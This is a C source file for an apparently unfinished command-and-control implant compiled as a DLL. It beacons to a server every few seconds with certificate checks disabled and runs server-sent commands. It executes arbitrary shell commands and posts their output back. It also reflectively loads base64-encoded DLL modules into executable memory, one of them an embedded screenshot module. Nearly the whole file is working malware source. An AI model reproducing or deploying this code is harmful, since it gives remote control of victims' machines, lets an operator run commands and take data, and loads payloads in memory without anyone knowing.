// cl.exe /LD /MD main.c moduleloader.c /Fo.\obj\ /O2 /Ot /GL

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#include "commandlist.h"
#include "common.h"
#include "messagebox.h"
#include "screenshot.h"
#include "base64.h"

#define CURL_STATICLIB
#include "tinycurl\include\curl\curl.h"

// Library for MessageBox
#pragma comment(lib, "user32.lib")

// Libraries needed for tinycurl
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "normaliz.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")

CommandNode* commandList = NULL;

int main(void);
void jitter_connect(void);
void command_loop(void);
char *execute_command(const char *cmd);

__declspec(dllexport) void MainExport(void);

// This is for libcurl response data
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Global used to send data back to the server
char* STORED_RESPONSE = NULL;

// Built-in Commands
char* CMD_exec(char* args)
{
    char* tmp = execute_command(args);
    printf("Command: %s\nResult: %s\n", args, tmp);
    return tmp;
}

char* CMD_shell(char* args)
{
    MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
    return NULL;
}

char* CMD_load(char* args)
{
    printf("Received load command with arguments: %s\n", args);
    size_t module_len = 0;
    unsigned char* module = base64_decode(args, strlen(args), &module_len);
    LPVOID lpBuffer = NULL;
    HANDLE hModule  = NULL;

    printf("Module: %p", module);
    printf("Module length: %zu\n", module_len);
    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    lpBuffer = VirtualAlloc(NULL, module_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if( !lpBuffer )
		BREAK_WITH_ERROR( "Failed to allocate space" );

    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
    memcpy(lpBuffer, module, module_len);
    printf("memcpy\n");
    fflush(stdout);

    CommandNodePointer func;
    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
	if( !hModule )
		BREAK_WITH_ERROR( "Failed to inject the DLL" );
    
    CommandNode* tester = func();
    printf("Tester: %s\n", tester->command);
    printf("Done with reflective test.\n");

    insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));

    printf("Inserted command!\n");

    return NULL;
}

char* CMD_quit(char* args)
{
    exit(0);
}

char* CMD_install(char* args)
{
    FILE *fp = fopen("installed.txt", "w");
    if (fp != NULL)
    {
        fprintf(fp, "Installed\n");
        fclose(fp);
    }
    return NULL;
}

// // Callback function to handle incoming data
// size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
// {
//     // Null-terminate the response just in case
//     char* data = ptr;
//     data[(size*nmemb)-1] = '\0';
//     printf("Received data: %s\n", (char *)ptr);
    
//     // Find the first space character to separate command and arguments
//     char *space_pos = strchr(data, ' ');

//     // Replace space with null byte to separate command and arguments
//     if (space_pos != NULL)
//     {
//         *space_pos = '\0';
//     }
//     // Calculate pointers for command and arguments
//     char *command = data;
//     char *arguments = space_pos + 1;

//     CommandNode* commandnode = findCommandNode(commandList, command);

//     if (commandnode != NULL)
//     {
//         STORED_RESPONSE = commandnode->function(arguments);
//     }

//     return size * nmemb;
// }

// Callback function to handle incoming data
void check_response(char* data)
{   
    // Find the first space character to separate command and arguments
    char *space_pos = strchr(data, ' ');

    // Replace space with null byte to separate command and arguments
    if (space_pos != NULL)
    {
        *space_pos = '\0';
    }
    // Calculate pointers for command and arguments
    char *command = data;
    char *arguments = space_pos + 1;

    CommandNode* commandnode = findCommandNode(commandList, command);

    if (commandnode != NULL)
    {
        STORED_RESPONSE = commandnode->function(arguments);
    }
}

void ReflectiveTest(void)
{
    LPVOID lpBuffer = NULL;
    HANDLE hModule  = NULL;

    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    lpBuffer = VirtualAlloc(NULL, screenshot_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if( !lpBuffer )
		BREAK_WITH_ERROR( "Failed to allocate space" );

    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
    memcpy(lpBuffer, screenshot_dll, screenshot_dll_len);
    printf("memcpy\n");
    fflush(stdout);

    CommandNodePointer func;
    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
	if( !hModule )
		BREAK_WITH_ERROR( "Failed to inject the DLL" );
    
    CommandNode* tester = func();
    printf("Tester: %s\n", tester->command);
    STORED_RESPONSE = tester->function("some args");
    printf("Done with reflective test.\n");
}

int main(void)
{
    ReflectiveTest();
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Initialize built-in commands
    insertCommandNode(&commandList, createCommandNode("exec", CMD_exec));
    insertCommandNode(&commandList, createCommandNode("shell", CMD_shell));
    insertCommandNode(&commandList, createCommandNode("load", CMD_load));
    insertCommandNode(&commandList, createCommandNode("quit", CMD_quit));
    insertCommandNode(&commandList, createCommandNode("install", CMD_install));

    // Start C2
    jitter_connect();

    // End
    curl_global_cleanup();
}

void jitter_connect()
{
    // TODO: Make this jitter instead of a constant time.
    // Seperate initial connect from interactive connection
    while (1)
    {
        command_loop();
        // Sleep for 5 minutes (in milliseconds)
        // Sleep(5 * 60 * 1000);
        Sleep(5 * 1000);  
    }
}

// Callback function to write received data to a dynamically growing buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
    
    // Reallocate memory to fit the new data
    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr_realloc == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 0;
    }
    
    mem->memory = ptr_realloc;
    memcpy(&(mem->memory[mem->size]), ptr, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = '\0';
    
    return realsize;
}

void command_loop(void)
{
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    // Initialize memory structure
    chunk.memory = malloc(1);  // Start with a small initial size
    if (chunk.memory == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }
    chunk.size = 0;  // No data yet
    
    char* tmp = NULL;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");

        // If STORED_RESPONSE is not NULL, we have data to send to the server
        if (STORED_RESPONSE != NULL)
        {
            printf("sending response: %s\n", STORED_RESPONSE);
            char *tmp = strdup(STORED_RESPONSE);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
            free(STORED_RESPONSE);
            STORED_RESPONSE = NULL;
        }
        else
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
        }

        // Disable SSL certificate verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Specify the callback function to handle the response data
        // curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        // Perform the request
        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        else
        {
            // Get the response code if needed
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            printf("Response code: %ld\n", response_code);
            check_response(chunk.memory);
        }

        // Cleanup
        if (tmp) {free(tmp);}
        curl_easy_cleanup(curl);
    }
}

// Execute a command and capture its output. Cross-compilable for both Unix and Windows
char *execute_command(const char *cmd) {
    #ifdef _WIN32
    #define popen _popen
    #define pclose _pclose
    #endif
    FILE *fp;
    char *result = NULL;
    char line[1024];
    size_t len = 0;
    size_t total_size = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if (fp == NULL) {
        fprintf(stderr, "Failed to run command\n");
        return NULL;
    }

    // Read output line by line and dynamically allocate memory
    while (fgets(line, sizeof(line), fp) != NULL)
    {
        size_t line_length = strlen(line);
        result = realloc(result, total_size + line_length + 1);
        if (result == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            pclose(fp);
            return NULL;
        }
        strcpy(result + total_size, line);
        total_size += line_length;
    }

    // Clean up
    pclose(fp);

    return result;
}

__declspec(dllexport) void MainExport(void)
{
    main();
}
